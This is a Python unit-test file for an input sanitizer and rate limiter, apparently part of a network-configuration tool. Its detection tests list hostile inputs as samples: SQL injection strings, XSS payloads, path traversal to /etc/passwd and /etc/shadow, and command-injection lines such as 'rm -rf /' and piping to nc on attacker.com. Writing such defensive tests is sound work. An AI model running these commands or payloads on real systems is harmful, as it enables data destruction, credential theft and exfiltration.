"""Unit tests for input sanitization and security."""

import pytest
from datetime import datetime, timedelta
from src.utils.input_sanitization import (
    InputSanitizer,
    RateLimiter,
    RateLimitConfig,
    ThreatLevel,
    AttackType,
    get_input_sanitizer,
    get_rate_limiter
)


class TestInputSanitizer:
    """Test input sanitization functionality."""
    
    def test_sanitizer_initialization(self):
        """Test sanitizer initializes correctly."""
        sanitizer = InputSanitizer(max_length=500, strict_mode=True)
        assert sanitizer.max_length == 500
        assert sanitizer.strict_mode is True
        assert sanitizer.allow_html is False
    
    def test_safe_input(self):
        """Test that safe input passes validation."""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize("Configure bandwidth for switch1 to 100Mbps")
        
        assert result.is_safe is True
        assert result.threat_level == ThreatLevel.SAFE
        assert len(result.violations) == 0
        assert result.sanitized_input == "Configure bandwidth for switch1 to 100Mbps"
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        sanitizer = InputSanitizer()
        
        # Test various SQL injection patterns
        malicious_inputs = [
            "SELECT * FROM users",
            "DROP TABLE network_config",
            "' OR '1'='1",
            "admin'--",
            "1; DROP TABLE users",
            "UNION SELECT password FROM users"
        ]
        
        for malicious_input in malicious_inputs:
            result = sanitizer.sanitize(malicious_input)
            assert result.is_safe is False
            assert result.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]
            assert any(v.attack_type == AttackType.SQL_INJECTION for v in result.violations)
    
    def test_xss_detection(self):
        """Test XSS pattern detection."""
        sanitizer = InputSanitizer()
        
        # Test various XSS patterns
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='malicious.com'></iframe>",
            "<svg onload=alert('XSS')>"
        ]
        
        for malicious_input in malicious_inputs:
            result = sanitizer.sanitize(malicious_input)
            assert result.is_safe is False
            assert result.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]
            assert any(v.attack_type == AttackType.XSS for v in result.violations)
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection."""
        sanitizer = InputSanitizer()
        
        # Test various command injection patterns
        malicious_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "$(whoami)",
            "`cat /etc/shadow`"
        ]
        
        for malicious_input in malicious_inputs:
            result = sanitizer.sanitize(malicious_input)
            assert result.is_safe is False
            assert result.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]
            assert any(v.attack_type == AttackType.COMMAND_INJECTION for v in result.violations)
    
    def test_path_traversal_detection(self):
        """Test path traversal pattern detection."""
        sanitizer = InputSanitizer()
        
        # Test various path traversal patterns
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "~/../../etc/shadow",
            "/etc/passwd",
            "C:\\Windows\\System32"
        ]
        
        for malicious_input in malicious_inputs:
            result = sanitizer.sanitize(malicious_input)
            assert result.is_safe is False
            assert result.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]
            assert any(v.attack_type == AttackType.PATH_TRAVERSAL for v in result.violations)
    
    def test_excessive_length_detection(self):
        """Test excessive length detection."""
        sanitizer = InputSanitizer(max_length=100)
        long_input = "A" * 200
        
        result = sanitizer.sanitize(long_input)
        
        assert len(result.sanitized_input) == 100
        assert any(v.attack_type == AttackType.EXCESSIVE_LENGTH for v in result.violations)
        assert "Truncated" in " ".join(result.modifications_made)
    
    def test_null_byte_removal(self):
        """Test null byte removal."""
        sanitizer = InputSanitizer()
        input_with_null = "test\x00malicious"
        
        result = sanitizer.sanitize(input_with_null)
        
        assert '\x00' not in result.sanitized_input
        assert "Removed null bytes" in result.modifications_made
    
    def test_whitespace_normalization(self):
        """Test whitespace normalization."""
        sanitizer = InputSanitizer()
        input_with_whitespace = "test    multiple   spaces\n\n\ntabs\t\t\there"
        
        result = sanitizer.sanitize(input_with_whitespace)
        
        # Should normalize to single spaces
        assert "  " not in result.sanitized_input
        assert "\n\n" not in result.sanitized_input
    
    def test_context_specific_sanitization_intent(self):
        """Test intent-specific sanitization."""
        sanitizer = InputSanitizer()
        
        # Network intent with valid characters
        intent = "Configure switch1:port2 with bandwidth 100Mbps at 192.168.1.1"
        result = sanitizer.sanitize(intent, context="intent")
        
        assert result.is_safe is True
        assert ":" in result.sanitized_input  # Colons allowed in network context
        assert "." in result.sanitized_input  # Dots allowed in network context
    
    def test_context_specific_sanitization_config(self):
        """Test config-specific sanitization."""
        sanitizer = InputSanitizer()
        
        # Config should be very restrictive
        config = "config_name_123"
        result = sanitizer.sanitize(config, context="config")
        
        assert result.is_safe is True
        assert result.sanitized_input == config
        
        # Special characters should be removed
        config_with_special = "config@name#123"
        result = sanitizer.sanitize(config_with_special, context="config")
        assert "@" not in result.sanitized_input
        assert "#" not in result.sanitized_input
    
    def test_non_string_input(self):
        """Test handling of non-string input."""
        sanitizer = InputSanitizer()
        
        result = sanitizer.sanitize(12345)
        
        assert result.is_safe is False
        assert any(v.attack_type == AttackType.MALFORMED_INPUT for v in result.violations)
    
    def test_validate_network_resource_name(self):
        """Test network resource name validation."""
        sanitizer = InputSanitizer()
        
        # Valid names
        assert sanitizer.validate_network_resource_name("switch1") is True
        assert sanitizer.validate_network_resource_name("port-2") is True
        assert sanitizer.validate_network_resource_name("192.168.1.1") is True
        assert sanitizer.validate_network_resource_name("host_1") is True
        
        # Invalid names
        assert sanitizer.validate_network_resource_name("") is False
        assert sanitizer.validate_network_resource_name("a" * 300) is False
        assert sanitizer.validate_network_resource_name("switch@1") is False
        assert sanitizer.validate_network_resource_name("port#2") is False
    
    def test_validate_ip_address(self):
        """Test IP address validation."""
        sanitizer = InputSanitizer()
        
        # Valid IPv4
        assert sanitizer.validate_ip_address("192.168.1.1") is True
        assert sanitizer.validate_ip_address("10.0.0.1") is True
        assert sanitizer.validate_ip_address("255.255.255.255") is True
        
        # Invalid IPv4
        assert sanitizer.validate_ip_address("256.1.1.1") is False
        assert sanitizer.validate_ip_address("192.168.1") is False
        assert sanitizer.validate_ip_address("not.an.ip.address") is False
        
        # Valid IPv6
        assert sanitizer.validate_ip_address("2001:0db8:85a3:0000:0000:8a2e:0370:7334") is True
        assert sanitizer.validate_ip_address("::1") is True
    
    def test_user_and_source_tracking(self):
        """Test that violations track user and source IP."""
        sanitizer = InputSanitizer()
        
        result = sanitizer.sanitize(
            "SELECT * FROM users",
            user_id="user123",
            source_ip="192.168.1.100"
        )
        
        assert len(result.violations) > 0
        for violation in result.violations:
            assert violation.user_id == "user123"
            assert violation.source_ip == "192.168.1.100"


class TestRateLimiter:
    """Test rate limiting functionality."""
    
    @pytest.mark.asyncio
    async def test_rate_limiter_initialization(self):
        """Test rate limiter initializes correctly."""
        config = RateLimitConfig(
            requests_per_minute=10,
            requests_per_hour=100,
            burst_size=5
        )
        limiter = RateLimiter(config)
        
        assert limiter.config.requests_per_minute == 10
        assert limiter.config.requests_per_hour == 100
        assert limiter.config.burst_size == 5
    
    @pytest.mark.asyncio
    async def test_rate_limit_allows_normal_traffic(self):
        """Test that normal traffic is allowed."""
        config = RateLimitConfig(requests_per_minute=60)
        limiter = RateLimiter(config)
        
        # Make a few requests
        for i in range(5):
            is_allowed, reason = await limiter.check_rate_limit("client1")
            assert is_allowed is True
            assert reason is None
    
    @pytest.mark.asyncio
    async def test_rate_limit_blocks_excessive_requests(self):
        """Test that excessive requests are blocked."""
        config = RateLimitConfig(
            requests_per_minute=5,
            block_duration_minutes=1
        )
        limiter = RateLimiter(config)
        
        # Make requests up to the limit
        for i in range(5):
            is_allowed, _ = await limiter.check_rate_limit("client1")
            assert is_allowed is True
        
        # Next request should be blocked
        is_allowed, reason = await limiter.check_rate_limit("client1")
        assert is_allowed is False
        assert reason is not None
        assert "Exceeded" in reason
    
    @pytest.mark.asyncio
    async def test_rate_limit_burst_protection(self):
        """Test burst protection."""
        config = RateLimitConfig(
            requests_per_minute=60,
            burst_size=3
        )
        limiter = RateLimiter(config)
        
        # Make burst requests
        for i in range(3):
            is_allowed, _ = await limiter.check_rate_limit("client1")
            assert is_allowed is True
        
        # Next burst request should be blocked
        is_allowed, reason = await limiter.check_rate_limit("client1")
        assert is_allowed is False
        assert "burst" in reason.lower()
    
    @pytest.mark.asyncio
    async def test_rate_limit_per_client(self):
        """Test that rate limits are per client."""
        config = RateLimitConfig(requests_per_minute=5)
        limiter = RateLimiter(config)
        
        # Client 1 makes requests
        for i in range(5):
            is_allowed, _ = await limiter.check_rate_limit("client1")
            assert is_allowed is True
        
        # Client 1 is blocked
        is_allowed, _ = await limiter.check_rate_limit("client1")
        assert is_allowed is False
        
        # Client 2 should still be allowed
        is_allowed, _ = await limiter.check_rate_limit("client2")
        assert is_allowed is True
    
    @pytest.mark.asyncio
    async def test_rate_limit_reset(self):
        """Test rate limit reset."""
        config = RateLimitConfig(requests_per_minute=5)
        limiter = RateLimiter(config)
        
        # Make requests to trigger limit
        for i in range(6):
            await limiter.check_rate_limit("client1")
        
        # Verify blocked
        is_allowed, _ = await limiter.check_rate_limit("client1")
        assert is_allowed is False
        
        # Reset client
        await limiter.reset_client("client1")
        
        # Should be allowed again
        is_allowed, _ = await limiter.check_rate_limit("client1")
        assert is_allowed is True
    
    @pytest.mark.asyncio
    async def test_rate_limit_stats(self):
        """Test rate limit statistics."""
        config = RateLimitConfig(requests_per_minute=60)
        limiter = RateLimiter(config)
        
        # Make some requests
        for i in range(5):
            await limiter.check_rate_limit("client1")
        
        # Get stats
        stats = await limiter.get_client_stats("client1")
        
        assert stats is not None
        assert stats["client_id"] == "client1"
        assert stats["total_requests"] == 5
        assert stats["requests_last_minute"] == 5
        assert stats["is_blocked"] is False
    
    @pytest.mark.asyncio
    async def test_rate_limit_cleanup(self):
        """Test cleanup of old entries."""
        config = RateLimitConfig(requests_per_minute=60)
        limiter = RateLimiter(config)
        
        # Make request
        await limiter.check_rate_limit("client1")
        
        # Verify entry exists
        stats = await limiter.get_client_stats("client1")
        assert stats is not None
        
        # Manually set old timestamp
        limiter._clients["client1"].request_timestamps.clear()
        old_time = datetime.now() - timedelta(days=2)
        limiter._clients["client1"].request_timestamps.append(old_time)
        
        # Run cleanup
        await limiter.cleanup_old_entries()
        
        # Entry should be removed
        stats = await limiter.get_client_stats("client1")
        assert stats is None


class TestGlobalInstances:
    """Test global instance getters."""
    
    def test_get_input_sanitizer(self):
        """Test getting global input sanitizer."""
        sanitizer1 = get_input_sanitizer()
        sanitizer2 = get_input_sanitizer()
        
        # Should return same instance
        assert sanitizer1 is sanitizer2
    
    def test_get_rate_limiter(self):
        """Test getting global rate limiter."""
        limiter1 = get_rate_limiter()
        limiter2 = get_rate_limiter()
        
        # Should return same instance
        assert limiter1 is limiter2


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
